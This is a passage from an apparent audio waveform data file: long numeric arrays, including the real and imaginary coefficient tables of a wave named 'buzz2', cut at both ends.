.000201, -.000202, .000202, -.000203, .000203, -.000204, .000204, -.000205, .000205, -.000205, .000206, -.000206, .000207, -.000207, .000208, -.000208, .000209, -.000209, .00021, -.00021, .00021, -.000211, .000211, -.000212, .000212, -.000213, .000213, -.000214, .000214, -.000214, .000215, -.000215, .000216, -.000216, .000217, -.000217, .000218, -.000218, .000218, -.000219, .000219, -.00022, .00022, -.000221, .000221, -.000221, .000222, -.000222, .000223, -.000223, .000224, -.000224, .000224, -.000225, .000225, -.000226, .000226, -.000227, .000227, -.000227, .000228, -.000228, .000229, -.000229, .00023, -.00023, .00023, -.000231, .000231, -.000232, .000232, -.000233, .000233, -.000234, .000234, -.000234, .000235, -.000235, .000236, -.000236, .000236, -.000237, .000237, -.000238, .000238, -.000238, .000239, -.000239, .00024, -.00024, .000226, -.000227, .000227, -.000227, .000228, -.000228, .000229, -.000229, .000229, -.00023, .00023, -.00023, .000231, -.000231, .000232, -.000232, .000232, -.000233, .000233, -.000234, .000234, -.000234, .000235, -.000235, .000235, -.000236, .000236, -.000237, .000237, -.000237, .000238, -.000238, .000238, -.000239, .000239, -.000239, .00024, -.00024, .000241, -.000241, .000241, -.000242, .000242, -.000242, .000243, -.000243, .000243, -.000244, .000244, -.000244, .000245, -.000245, .000246, -.000246, .000246, -.000247, .000247, -.000247, .000248, -.000248, .000248, -.000249, .000249, -.000249, .00025, -.00025, .00025, -.000251, .000251, -.000251, .000252, -.000252, .000252, -.000253, .000253, -.000253, .000254, -.000254, .000254, -.000255, .000255, -.000255, .000256, -.000256, .000256, -.000257, .000257, -.000257, .000258, -.000258, .000258, -.000259, .000259, -.000259, .00026, -.00026, .00026, -.00026, .000261, -.000261, .000231, -.000231, .000232, -.000232, .000232, -.000232, .000233, -.000233, .000233, -.000234, .000234, -.000234, .000234, -.000235, .000235, -.000235, .000235, -.000236, .000236, -.000236, .000236, -.000237, .000237, -.000237, .000237, -.000238, .000238, -.000238, .000238, -.000239, .000239, -.000239, .000239, -.000239, .00024, -.00024, .00024, -.00024, .000241, -.000241, .000241, -.000241, .000242, -.000242, .000242, -.000242, .000242, -.000243, .000243, -.000243, .000243, -.000244, .000244, -.000244, .000244, -.000244, .000245, -.000245, .000245, -.000245, .000245, -.000246, .000246, -.000246, .000246, -.000246, .000247, -.000247, .000247, -.000247, .000247, -.000248, .000248, -.000248, .000248, -.000248, .000248, -.000249, .000249, -.000249, .000249, -.000249, .000249, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000252, .000252, -.000252, .000252, -.000252, .000252, -.000252, .000253, -.000253, .000253, -.000253, .000253, -.000253, .000253, -.000254, .000254, -.000254, .000254, -.000254, .000254, -.000254, .000254, -.000255, .000255, -.000255, .000255, -.000255, .000255, -.000255, .000255, -.000255, .000256, -.000256, .000256, -.000256, .000256, -.000256, .000256, -.000256, .000256, -.000256, .000257, -.000257, .000257, -.000257, .000257, -.000257, .000257, -.000257, .000257, -.000257, .000257, -.000257, .000257, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000258, -.000258, .000259, -.000259, .000259, -.000259, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.000251, .000251, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.00025, .00025, -.000249, .000249, -.000249, .000249, -.000249, .000249, -.000249, .000249, -.000249, .000249, -.000249, .000249, -.000248, .000248, -.000248, .000248, -.000248, .000248, -.000248, .000248, -.000248, .000247, -.000247, .000247, -.000247, .000247, -.000247, .000247, -.000247, .000246, -.000246, .000246, -.000246, .000246, -.000246, .000246, -.000245, .000245, -.000245, .000245, -.000245, .000245, -.000245, .000244, -.000244, .000244, -.000244, .000244, -.000243, .000243, -.000243, .000243, -.000243, .000243, -.000242, .000242, -.000242, .000242, -.000242, .000241, -.000241, .000241, -.000241, .000241, -.00024, .00024, -.00024, .00024, -.000239, .000239, -.000239, .000239, -.000239, .000238, -.000238, .000238, -.000238, .000237, -.000237, .000237, -.000237, .000236, -.000236, .000236, -.000236, .000235, -.000235, .000235, -.000235, .000234, -.000234, .000234, -.000233, .000233, -.000233, .000233, -.000232, .000232, -.000232, .000231, -.000231, .000231, -.000231, .00023, -.00023, .00023, -.000229, .000229, -.000229, .000228, -.000228, .000228, -.000227, .000227, -.000227, .000226, -.000226, .000226, -.000225, .000225, -.000225, .000224, -.000224, .000224, -.000223, .000223, -.000223, .000222, -.000222, .000222, -.000221, .000221, -.00022, .00022, -.00022, .000219, -.000219, .000218, -.000218, .000218, -.000217, .000217, -.000217, .000216, -.000216, .000215, -.000215, .000214, -.000214, .000214, -.000213, .000213, -.000212, .000212, -.000212, .000211, -.000211, .00021, -.00021, .000209, -.000209, .000209, -.000208, .000208, -.000207, .000207, -.000206, .000206, -.000205, .000205, -.000204, .000204, -.000203, .000203, -.000203, .000202, -.000202, .000201, -.000201, .0002, -.0002, .000199, -.000199, .000198, -.000198, .000197, -.000197, .000196, -.000196, .000195, -.000195, .000194, -.000194, .000193, -.000193, .000192, -.000191, .000191, -.00019, .00019, -.000189, .000189, -.000188, .000188, -.000187, .000187, -.000186, .000185, -.000185, .000184, -.000184, .000183, -.000183, .000182, -.000182, .000181, -.00018, .00018, -.000179, .000179, -.000178, .000177, -.000177, .000176, -.000176, .000175, -.000175, .000174, -.000173, .000173, -.000172, .000172, -.000171, .00017, -.00017, .000169, -.000168, .000168, -.000167, .000167, -.000166, .000165, -.000165, .000164, -.000163, .000163, -.000162, .000161, -.000161, .00016, -.00016, .000159, -.000158, .000158, -.000157, .000156, -.000156, .000155, -.000154, .000154, -.000153, .000152, -.000152, .000151, -.00015, .000149, -.000149, .000148, -.000147, .000147, -.000155, .000155, -.000154, .000153, -.000152, .000152, -.000151, .00015, -.000149, .000149, -.000148, .000147, -.000146, .000145, -.000145, .000144, -.000143, .000142, -.000142, .000141, -.00014, .000139, -.000139, .000138, -.000137, .000136, -.000135, .000135, -.000134, .000133, -.000132, .000131, -.000131, .00013, -.000129, .000128, -.000127, .000127, -.000126, .000125, -.000124, .000123, -.000122, .000122, -.000121, .00012, -.000119, .000118, -.000117, .000117, -.000116, .000115, -.000114, .000113, -.000112, .000111, -.000111, .00011, -.000109, .000108, -.000107, .000107, -.000106, .000105, -.000104, .000103, -.000102, .000101, -.0001, .0001, -.000099, .000098, -.000097, .000096, -.000095, .000094, -.000093, .000093, -.000092, .000091, -.00009, .000089, -.000088, .000087, -.000086, .000085, -.000085, .000084, -.000083, .000082, -.000081, .00008, -.000079, .000078, -.000077, .000077, -.000076, .000075, -.000074, .000073, -.000072, .000071, -.00007, .000069, -.000068, .000067, -.000066, .000065, -.000065, .000064, -.000063, .000062, -.000061, .00006, -.000059, .000058, -.000057, .000056, -.000055, .000054, -.000053, .000052, -.000052, .000051, -.00005, .000049, -.000048, .000047, -.000046, .000045, -.000044, .000043, -.000042, .000041, -.00004, .000039, -.000038, .000037, -.000036, .000035, -.000035, .000034, -.000033, .000032, -.000031, .00003, -.000029, .000028, -.000027, .000026, -.000025, .000024, -.000023, .000022, -.000021, .00002, -.000019, .000018, -.000017, .000016, -.000015, .000015, -.000014, .000013, -.000012, .000011, -.00001, .000009, -.000008, .000007, -.000006, .000005, -.000004, .000003, -.000002, .000001, 0, -.000001, .000002, -.000003, .000004, -.000005, .000006, -.000007, .000008, -.000008, .000009, -.00001, .000011, -.000012, .000013, -.000014, .000015, -.000016, .000017, -.000018, .000019, -.00002, .000021, -.000022, .000023, -.000024, .000025, -.000026, .000027, -.000028, .000029, -.00003, .000031, -.000031, .000032, -.000033, .000034, -.000035, .000036, -.000037, .000038, -.000039, .00004, -.000041, .000042, -.000043, .000044, -.000045, .000046, -.000047, .000047, -.000048, .000049, -.00005, .000051, -.000052, .000053, -.000054, .000055, -.000056, .000057, -.000058, .000059, -.00006, .000061, -.000061, .000062, -.000063, .000064, -.000065, .000066, -.000067, .000068, -.000069, .00007, -.000071, .000072, -.000072, .000073, -.000074, .000075, -.000076, .000077, -.000078, .000079, -.00008, .00008, -.000081, .000082, -.000083, .000084, -.000085, .000086, -.000087, .000088, -.000088, .000089, -.00009, .000091, -.000092, .000093, -.000094, .000094, -.000095, .000096, -.000097, .000098, -.000099, .0001, -.0001, .000101, -.000102, .000103, -.000104, .000105, -.000105, .000106, -.000107, .000108, -.000109, .00011, -.00011, .000111, -.000112, .000113, -.000114, .000115, -.000115, .000116, -.000117, .000118, -.000119, .000119, -.00012, .000121, -.000122, .000122, -.000123, .000124, -.000125, .000126, -.000126, .000127, -.000128, .000129, -.000129, .00013, -.000131, .000132, -.000132, .000133, -.000134, .000135, -.000135, .000136, -.000137, .000138, -.000138, .000139, -.00014, .00014, -.000141, .000142, -.000142, .000143, -.000144, .000145, -.000145, .000146, -.000147, .000147, -.000148, .000149, -.000149, .00015, -.000151, .000151, -.000152, .000153, -.000153, .000154, -.000155, .000155, -.000156, .000156, -.000157, .000158, -.000158, .000159, -.00016, .00016, -.000161, .000161, -.000162, .000162, -.000163, .000164, -.000164, .000165, -.000165, .000166, -.000167, .000167, -.000168, .000168, -.000169, .000169, -.00017, .00017, -.000171, .000171, -.000172, .000172, -.000173, .000173, -.000174, .000174, -.000175, .000175, -.000176, .000176, -.000177, .000177, -.000178, .000178, -.000179, .000179, -.00018, .00018, -.000181, .000181, -.000181, .000182, -.000182, .000183, -.000183, .000184, -.000184, .000184, -.000185, .000185, -.000186, .000186, -.000186, .000187, -.000187, .000187, -.000188, .000188, -.000188, .000189, -.000189, .00019, -.00019, .00019, -.00019, .000191, -.000191, .000191, -.000192, .000192, -.000192, .000193, -.000193, .000193, -.000193, .000194, -.000194, .000194, -.000194, .000195, -.000195, .000195, -.000195, .000196, -.000196, .000196, -.000196, .000196, -.000197, .000197, -.000197, .000197, -.000197, .000198, -.000198, .000198, -.000198, .000198, -.000198, .000199, -.000199, .000199, -.000199, .000199, -.000199, .000199, -.000199, .000199, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.0002, .0002, -.000199, .000199, -.000199, .000199, -.000199, .000199, -.000199, .000199, -.000199, .000198, -.000198, .000198, -.000198, .000198, -.000198, .000197, -.000197, .000197, -.000197, .000197, -.000196, .000196, -.000196, .000196, -.000196, .000195, -.000195, .000195, -.000195, .000194, -.000194, .000194, -.000193, .000193, -.000193, .000193, -.000192, .000192, -.000192, .000191, -.000191, .000191, -.00019, .00019, -.00019, .000189, -.000189, .000189, -.000188, .000188, -.000188, .000187, -.000187, .000186, -.000186, .000186, -.000185, .000185, -.000184, .000184, -.000183, .000183, -.000183, .000182, -.000182, .000181, -.000181, .00018, -.00018, .000179, -.000179, .000178, -.000178, .000177, -.000177, .000176, -.000176, .000175, -.000175, .000174, -.000174, .000173, -.000173, .000172, -.000171, .000171, -.00017, .00017, -.000169, .000168, -.000168, .000167, -.000167, .000166, -.000165, .000165, -.000164, .000164, -.000163, .000162, -.000162, .000161, -.00016, .00016, -.000159, .000158, -.000158, .000157, -.000156, .000156, -.000155, .000154, -.000153, .000153, -.000152, .000151, -.000151, .00015, -.000149, .000148, -.000148, .000147, -.000146, .000145, -.000145, .000144, -.000143, .000142, -.000142, .000141, -.00014, .000139, -.000138, .000138, -.000137, .000149, -.000148, .000147, -.000146, .000145, -.000144, .000144, -.000143, .000142, -.000141, .00014, -.000139, .000138, -.000137, .000136, -.000135, .000134, -.000133, .000132, -.000131, .00013, -.000129, .000128, -.000127, .000126, -.000125, .000124, -.000123, .000122, -.000121, .00012, -.000119, .000118, -.000117, .000116, -.000115, .000114, -.000113, .000112, -.000111, .00011, -.000108, .000107, -.000106, .000105, -.000104, .000103, -.000102, .000101, -.0001, .000099, -.000098, .000096, -.000095, .000094, -.000093, .000092, -.000091, .00009, -.000089, .000087, -.000086, .000085, -.000084, .000083, -.000082, .00008, -.000079, .000078, -.000077, .000076, -.000075, .000074, -.000072, .000071, -.00007, .000069, -.000068, .000066, -.000065, .000064, -.000063, .000062, -.000061, .000059, -.000058, .000057, -.000056, .000054, -.000053, .000052, -.000051, .00005, -.000048, .000047, -.000046, .000045, -.000043, .000042, -.000041, .00004, -.000039, .000037, -.000036, .000035, -.000034, .000032, -.000031, .00003, -.000029, .000027, -.000026, .000025, -.000024, .000023, -.000021, .00002, -.000019, .000018, -.000016, .000015, -.000014, .000013, -.000011, .00001, -.000009, .000008, -.000006, .000005, -.000004, .000003, -.000001 ] } ],
	[ "buzz2",       { real: [ 0, .126773, .017974, -.018236, -.000572, .018139, -.001907, .002945, -.007326, .005861, .000958, .001293, -.001846, -.002062, .001217, -.000753, .001256, -.001891, -.002088, .001745, -.000204, .000173, -.000884, .002247, -.00241, .002232, .002181, -.003279, .003242, -.00095, -.001026, .002184, -.003085, .002124, -.002152, -.001293, .002599, -.002155, -.002941, .002503, .002728, -.001087, .000901, .001888, -.002741, .002782, -.002764, .001516, -.001023, -.001274, .001432, -.002487, .002618, -.00191, .001318, -.000263, -.001235, .00215, -.002365, .002234, -.000981, .000604, .00032, -.000442, .001822, -.001934, .000528, -.00068, -.000302, .001319, -.00185, .001594, -.001648, .00065, -.000618, -.000763, .000747, -.001512, .001385, -.001188, .000802, .000728, -.000843, .001206, -.001445, .001227, -.001186, -.000298, -.000425, -.001364, .000437, -.00135, .001139, -.000642, -.000374, .000923, -.001139, .000224, -.001272, .001266, -.000643, .000204, -.000017, -.001054, -.001249, -.001247, .001118, -.000955, -.001001, .000121, -.001124, .000892, -.00105, -.000692, .001116, -.000923, -.000601, -.001035, .000094, -.000626, .000494, -.000222, -.000828, .000203, -.001105, -.000212, -.001105, -.00089, -.001009, -.00097, -.001022, -.001044, -.001018, -.001014, -.000921, -.000681, -.001038, -.000811, -.001011, -.000766, -.000843, -.00102, -.00062, -.000869, -.001005, -.001001, -.000934, -.000999, -.000986, -.000806, -.000909, -.000986, -.000946, -.000979, -.000912, -.000751, -.000971, -.000805, -.000872, -.000801, -.000869, -.000789, -.000867, -.000866, -.000822, -.000785, -.000851, -.000853, -.000853, -.00082, -.000745, -.000841, -.000843, -.000801, -.000799, -.000835, -.000834, -.00079, -.000815, -.000764, -.000795, -.000708, -.000787, -.000818, -.000806, -.000742, -.000808, -.000783, -.000745, -.000766, -.000766, -.00064, -.000769, -.000747, -.000741, -.000766, -.000744, -.000747, -.000759, -.00076, -.000749, -.000698, -.000736, -.000753, -.000742, -.000743, -.000747, -.00074, -.000716, -.000739, -.00074, -.000731, -.000723, -.000717, -.000716, -.000693, -.000679, -.000631, -.000604, -.000564, -.000485, -.000444, -.000345, -.000282, -.000179, -.00009, .000013, .000107, .000182, .000272, .000354, .000428, .000479, .00053, .00058, .000613, .00063, .000645, .000622, .000631, .000629, .000627, .000632, .000634, .000626, .00062, .000625, .000627, .000617, .00061, .000617, .00062, .000609, .000602, .000611, .000614, .000602, .000595, .000605, .000609, .000596, .000588, .000599, .000604, .00059, .000581, .000594, .0006, .000585, .000575, .000589, .000595, .000579, .00057, .000585, .000591, .000574, .000565, .000581, .000587, .00057, .00056, .000576, .000583, .000566, .000555, .000572, .000579, .000562, .000551, .000569, .000576, .000558, .000547, .000565, .000572, .000554, .000543, .000561, .000569, .00055, .000539, .000558, .000566, .000547, .000536, .000555, .000562, .000543, .000532, .000551, .000559, .00054, .000529, .000548, .000556, .000537, .000525, .000545, .000553, .000534, .000522, .000542, .00055, .000531, .000519, .000539, .000547, .000528, .000516, .000536, .000544, .000525, .000513, .000533, .000541, .000522, .00051, .000531, .000539, .00052, .000508, .000528, .000536, .000517, .000505, .000525, .000533, .000514, .000502, .000522, .00053, .000512, .0005, .00052, .000528, .000509, .000497, .000517, .000525, .000507, .000495, .000514, .000522, .000504, .000492, .000512, .00052, .000502, .00049, .00051, .000518, .000499, .000487, .000507, .000515, .000497, .000485, .000505, .000512, .000495, .000483, .000502, .00051, .000493, .000481, .0005, .000508, .000491, .000478, .000498, .000505, .000488, .000476, .000495, .000503, .000486, .000474, .000493, .000501, .000484, .000472, .000491, .000498, .000482, .00047, .000489, .000496, .00048, .000468, .000487, .000494, .000479, .000466, .000485, .000492, .000476, .000463, .000482, .00049, .000474, .000462, .00048, .000488, .000472, .00046, .000478, .000485, .00047, .000458, .000476, .000483, .000468, .000456, .000474, .000481, .000467, .000455, .000472, .000479, .000465, .000452, .000471, .000477, .000463, .000451, .000468, .000475, .000461, .000449, .000467, .000473, .000459, .000447, .000465, .000471, .000458, .000446, .000463, .000469, .000456, .000444, .000461, .000467, .000454, .000442, .000459, .000465, .000452, .000441, .000457, .000464, .000451, .00044, .000456, .000462, .000449, .000438, .000454, .00046, .000447, .000435, .000452, .000458, .000446, .000434, .00045, .000456, .000445, .000433, .000449, .000455, .000443, .000434, .000447, .000453, .000441, .000429, .000449, .000445, .000441, .000423, .000458, .000468, .000468, .000455, .000469, .000476, .000464, .000452, .000468, .000474, .000462, .000449, .000466, .000473, .000462, .000448, .000465, .00047, .000459, .000447, .000464, .000469, .000457, .000446, .000462, .000467, .000456, .000444, .00046, .000466, .000454, .000442, .000458, .000464, .000453, .000441, .000457, .000462, .000451, .00044, .000455, .00046, .00045, .000439, .000454, .000459, .000448, .000436, .000452, .000457, .000447, .000436, .00045, .000456, .000445, .000434, .000449, .000454, .000444, .000432, .000448, .000452, .000443, .00043, .000446, .000451, .000441, .000429, .000444, .000449, .00044, .000429, .000443, .000448, .000438, .000427, .000442, .000446, .000437, .000425, .00044, .000445, .000436, .000424, .000438, .000443, .000435, .000423, .000436, .000442, .000433, .000421, .000436, .00044, .000431, .00042, .000435, .000439, .00043, .000418, .000434, .000438, .000429, .000417, .000432, .000436, .000428, .000417, .00043, .000435, .000427, .000416, .000429, .000433, .000425, .000414, .000428, .000432, .000424, .000413, .000427, .000431, .000422, .000411, .000426, .000429, .000422, .00041, .000424, .000428, .00042, .00041, .000423, .000427, .000419, .000409, .000421, .000425, .000418, .000406, .00042, .000424, .000417, .000406, .000419, .000423, .000415, .000405, .000418, .000421, .000414, .000404, .000416, .00042, .000413, .000402, .000415, .000419, .000412, .000403, .000414, .000418, .00041, .000401, .000426, .000429, .000422, .000411, .000425, .000428, .000421, .000411, .000423, .000427, .00042, .00041, .000422, .000425, .000419, .000408, .000421, .000424, .000418, .000408, .00042, .000423, .000417, .000407, .000419, .000422, .000415, .000405, .000418, .000421, .000414, .000403, .000416, .000419, .000414, .000403, .000415, .000418, .000412, .000402, .000414, .000417, .000411, .000401, .000413, .000416, .00041, .0004, .000412, .000415, .000409, .000399, .000411, .000414, .000408, .000399, .00041, .000412, .000407, .000398, .000409, .000411, .000406, .000396, .000407, .00041, .000405, .000395, .000407, .000409, .000404, .000395, .000406, .000408, .000403, .000393, .000404, .000407, .000402, .000391, .000404, .000406, .000401, .00039, .000402, .000405, .000399, .000391, .000401, .000404, .000399, .000389, .0004, .000403, .000398, .000389, .000399, .000401, .000396, .000387, .000398, .0004, .000396, .000386, .000397, .000399, .000395, .000386, .000396, .000398, .000394, .000384, .000395, .000397, .000393, .000384, .000394, .000396, .000392, .000383, .000393, .000395, .000391, .000382, .000393, .000394, .00039, .000381, .000391, .000393, .000389, .00038, .00039, .000392, .000388, .000379, .00039, .000391, .000387, .000379, .000389, .00039, .000386, .000378, .000388, .000389, .000386, .000376, .000387, .000388, .000385, .000376, .000386, .000388, .000384, .000374, .000385, .000387, .000384, .000374, .000384, .000386, .000382, .000374, .000383, .000385, .000381, .00037, .000382, .000384, .00038, .000371, .000381, .000383, .000379, .000371, .00038, .000382, .000378, .00037, .00038, .000381, .000378, .000369, .000379, .00038, .000377, .000368, .000378, .000379, .000376, .000367, .000377, .000378, .000375, .000366, .000376, .000377, .000374, .000366, .000376, .000376, .000374, .000366, .000374, .000376, .000373, .000364, .000373, .000375, .000372, .000362, .000373, .000374, .000372, .000363, .000372, .000373, .00037, .000362, .000371, .000372, .000369, .000361, .00037, .000371, .000368, .000361, .00037, .000371, .000368, .000362, .000368, .00037, .000367, .000359, .000368, .000369, .000366, .000358, .000367, .000368, .000366, .000358, .000366, .000367, .000365, .000359, .000366, .000367, .000365, .000355, .000365, .000366, .000363, .000354, .000364, .000365, .000363, .000353, .000363, .000364, .000362, .000355, .000362, .000363, .000361, .000352, .000362, .000362, .00036, .000353, .000361, .000362, .000359, .000351, .00036, .000361, .000359, .000351, .00036, .00036, .000358, .000351, .000359, .000359, .000357, .000348, .000358, .000359, .000357, .000349, .000357, .000357, .000355, .000349, .000357, .000357, .000356, .000348, .000356, .000356, .000355, .000347, .000355, .000356, .000354, .000346, .000354, .000355, .000352, .000347, .000354, .000354, .000352, .000346, .000353, .000353, .000351, .000344, .000352, .000353, .000351, .000342, .000351, .000351, .00035, .000342, .00035, .000351, .000348, .000343, .00035, .000351, .00034, .000342, .00035, .00035, .000338, .000348, .000348, .000348, .000348, .000341, .000349, .000348, .000347, .000336, .000348, .000347, .000347, .000337, .000347, .000347, .000346, .00034, .000346, .000345, .000345, .00034, .000345, .000346, .000345, .000337, .000345, .000345, .000344, .000337, .000344, .000344, .000343, .000338, .000343, .000343, .000342, .000337, .000343, .000343, .000341, .000334, .000342, .000342, .000341, .000334, .000342, .000342, .000341, .000332, .000341, .000341, .00034, .000332, .00034, .00034, .000338, .000332, .00034, .000339, .000338, .000331, .000339, .000339, .000338, .000332, .000339, .000338, .000338, .000332, .000338, .000338, .000337, .000331, .000337, .000337, .000336, .000329, .000337, .000336, .000336, .00033, .000336, .000336, .000336, .000328, .000335, .000336, .000335, .000328, .000335, .000334, .000334, .000326, .000334, .000334, .000333, .000326, .000334, .000334, .000332, .000326, .000333, .000333, .000332, .000325, .000332, .000333, .000331, .000325, .000332, .000332, .000331, .000345, .000352, .00035, .000352, .000347, .000351, .000351, .000351, .000343, .000351, .00035, .00035, .000344, .00035, .00035, .000349, .000342, .00035, .00035, .000349, .000342, .000349, .000349, .000348, .000341, .000348, .000348, .000348, .000341, .000347, .000347, .000347, .000339, .000347, .000346, .000347, .00034, .000347, .000346, .000345, .000339, .000346, .000345, .000346, .00034, .000345, .000345, .000345, .000338, .000345, .000344, .000344, .000336, .000344, .000344, .000343, .000337, .000344, .000343, .000342, .000336, .000343, .000343, .000342, .000338, .000343, .000342, .000342, .000337, .000342, .000342, .000341, .000334, .000341, .000341, .000341, .000335, .000341, .000341, .00034, .000334, .00034, .000339, .000339, .000333, .000339, .000339, .000339, .000334, .000339, .000339, .000339, .000332, .000338, .000338, .000338, .000332, .000338, .000337, .000337, .000331, .000337, .000337, .000337, .00033, .000337, .000336, .000336, .00033, .000337, .000336, .000336, .00033, .000336, .000335, .000336, .000328, .000336, .000335, .000335, .000329, .000335, .000334, .000334, .00033, .000334, .000334, .000334, .000328, .000334, .000334, .000333, .000327, .000333, .000333, .000333, .000327, .000333, .000332, .000332, .000328, .000332, .000331, .000331, .000325, .000332, .000331, .000331, .000326, .000331, .000329, .000331, .000325, .000331, .00033, .00033, .000324, .00033, .000329, .00033, .000324, .000329, .000328, .000329, .000325, .000328, .000328, .000329, .000323, .000329, .000328, .000328, .000323, .000328, .000327, .000328, .000322, .000328, .000327, .000327, .000321, .000327, .000327, .000327, .000321, .000327, .000326, .000326, .000319, .000326, .000325, .000326, .000321, .000325, .000325, .000325, .000316, .000325, .000324, .000325, .000318, .000325, .000324, .000324, .000319, .000324, .000323, .000324, .00032, .000324, .000322, .000323, .000318, .000323, .000322, .000323, .000318, .000323, .000322, .000322, .000316, .000322, .000321, .000322, .000317, .000322, .000321, .000322, .000315, .000321, .00032, .000321, .000317, .000321, .00032, .000321, .000315, .000321, .000319, .00032, .000314, .00032, .000319, .000319, .000312, .000319, .000318, .000319, .000314, .000319, .000317, .000319, .000311, .000319, .000317, .000318, .000314, .000318, .000318, .000318, .000312, .000318, .000316, .000317, .000332, .000337, .000336, .000337, .000329, .000337, .000336, .000336, .000331, .000336, .000334, .000336, .00033, .000336, .000334, .000335, .000329, .000335, .000334, .000335, .00033, .000335, .000333, .000334, .00033, .000335, .000332, .000334, .000328, .000334, .000332, .000333, .00033, .000334, .000333, .000333, .000329, .000333, .000331, .000333, .000326, .000333, .000331, .000332, .000325, .000332, .000331, .000331, .000327, .000331, .00033, .000331, .000326, .000331, .000329, .000331, .000325, .00033, .00033, .000331, .000323, .00033, .000329, .00033, .000325, .00033, .000328, .000329, .000324, .000329, .000328, .000329, .000325, .000329, .000328, .000329, .000323, .000329, .000327, .000327, .000323, .000328, .000326, .000328, .000321, .000328, .000326, .000327, .000323, .000327, .000325, .000327, .000324, .000327, .000325, .000326, .000323, .000326, .000325, .000326, .000321, .000326, .000324, .000325, .000321, .000325, .000324, .000325, .00032, .000325, .000324, .000324, .000319, .000325, .000323, .000324, .00032, .000324, .000321, .000324, .000314, .000324, .000323, .000308, .000305, .000323, .000322, .000323, .000319, .000323, .000321, .000323, .000319, .000323, .00032, .000322, .000316, .000322, .00032, .000322, .000317, .000322, .000321, .000321, .000316, .000321, .00032, .000321, .000315, .000321, .000318, .00032, .000315, .000319, .000314, .00032, .00032, .000319, .000317, .00032, .000313, .00032, .000318, .000319, .000316, .000319, .000317, .000319, .000314, .000318, .000316, .000319, .000314, .000318, .000316, .000318, .000314, .000318, .000315, .000318, .000345, .000348, .000345, .000348, .000342, .000348, .000346, .000347, .000342, .000347, .000346, .000347, .000341, .000347, .000345, .000346, .000344, .000346, .000344, .000346, .000341, .000346, .000342, .000346, .000341, .000345, .000344, .000344, .000344, .000344, .000344, .000343, .000342, .000345, .000342, .000344, .00034, .000344, .000342, .000344, .00034, .000344, .000342, .000344, .000338, .000343, .000341, .000342, .000337, .000343, .000341, .000343, .000338, .000343, .000341, .000342, .000337, .000342, .000339, .000342, .000337, .000342, .000339, .000341, .000336, .000341, .000339, .000341, .000336, .000341, .000336, .00034, .000333, .00034, .000339, .00034, .000335, .00034, .000338, .000339, .000337, .000339, .000337, .000339, .000335, .000339, .000337, .000339, .000333, .000339, .000335, .000338, .000335, .000339, .000337, .000338, .000334, .000338, .000336, .000338, .000333, .000337, .000335, .000337, .000335, .000337, .000336, .000337, .000332, .000337, .000333, .000337, .000332, .000336, .000335, .000336, .000328, .000336, .000334, .000335, .00033, .000336, .000333, .000335, .00033, .000335, .000332, .000335, .000332, .000335, .000332, .000335, .00033, .000334, .000333, .000334, .000327, .000334, .000332, .000334, .000329, .000334, .000331, .000333, .000329, .000333, .00033, .000333, .000329, .000333, .000331, .000333, .000328, .000333, .00033, .000332, .000327, .000332, .00033, .000332, .000327, .000332, .000329, .000331, .000328, .000331, .000331, .000331, .000326, .000331, .000329, .000331, .000326, .000331, .000329, .00033, .000326, .00033, .000329, .00033, .000325, .00033, .000326, .00033, .000325, .000329, .000328, .000329, .000326, .000329, .000325, .000329, .000325, .000329, .000325, .000329, .000323, .000328, .000325, .000328, .000324, .000328, .000324, .000328, .000325, .000328, .000325, .000327, .000322, .000327, .000325, .000327, .000323, .000327, .000324, .000327, .000321, .000326, .000324, .000326, .000322, .000326, .000325, .000326, .00032, .000326, .000323, .000326, .000321, .000325, .000318, .000379, .000376, .000379, .000375, .000379, .000373, .000379, .000375, .000378, .000373, .000378, .000375, .000378, .000373, .000378, .000376, .000377, .000373, .000377, .000374, .000377, .000374, .000377, .000372, .000377, .000372, .000376, .000373, .000376, .000372, .000376, .000374, .000376, .000369, .000376, .000371, .000375, .000371, .000375, .000372, .000375, .000369, .000375, .000371, .000375, .00037, .000374, .000372, .000374, .000372, .000374, .00037, .000374, .000368, .000374, .000371, .000373, .000369, .000373, .00037, .000373, .000368, .000373, .000369, .000373, .000366, .000372, .000369, .000372, .000368, .000372, .000367, .000372, .000366, .000372, .000369, .000371, .000368, .000371, .000367, .000371, .000367, .000371, .000368, .000371, .000366, .00037, .000367, .00037, .000366, .00037, .000365, .00037, .000365, .00037, .000367, .000369, .000362, .000369, .000367, .000369, .000364, .000369, .000364, .000369, .000364, .000369, .000366, .000368, .000364, .000368, .000366, .000368, .000362, .000368, .000365, .000368, .000364, .000367, .000365, .000367, .000361, .000367, .000357, .000367, .000362, .000367, .000366, .000366, .000362, .000366, .000364, .000366, .000362, .000366, .000361, .000365, .000363, .000365, .000362, .000365, .000362, .000365, .00036, .000365, .00036, .000365, .000361, .000364, .00036, .000364, .00036, .000364, .000358, .000364, .000361, .000364, .000359, .000363, .000357, .000363, .000361, .000363, .000361, .000363, .00036, .000363, .000407, .00041, .000403, .00041, .000406, .00041, .000404, .000409, .000407, .000409, .000405, .000409, .000405, .000409, .000403, .000409, .000402, .000408, .000404, .000408, .000404, .000408, .000402, .000408, .000406, .000408, .000404, .000407, .000403, .000407, .000404, .000407, .000402, .000406, .000402, .000406, .000402, .000406, .000402, .000406, .000402, .000405, .000399, .000404, .000397, .000406, .000394, .000404, .000393, .000405, .000398, .000405, .000366, .000369, .000364, .000369, .000366, .000369, .000367, .000369, .000365, .000368, .000364, .000368, .000366, .000368, .000364, .000368, .000363, .000368, .000363, .000367, .000364, .000367, .000363, .000367, .000364, .000367, .000364, .000367, .000363, .000367, .000362, .000366, .000363, .000366, .000362, .000366, .000365 ],  imag: [ 0, -.049064, -.06626, .053048, -.003642, .016123, -.016702, -.003665, .002182, .00251, .003818, -.002636, 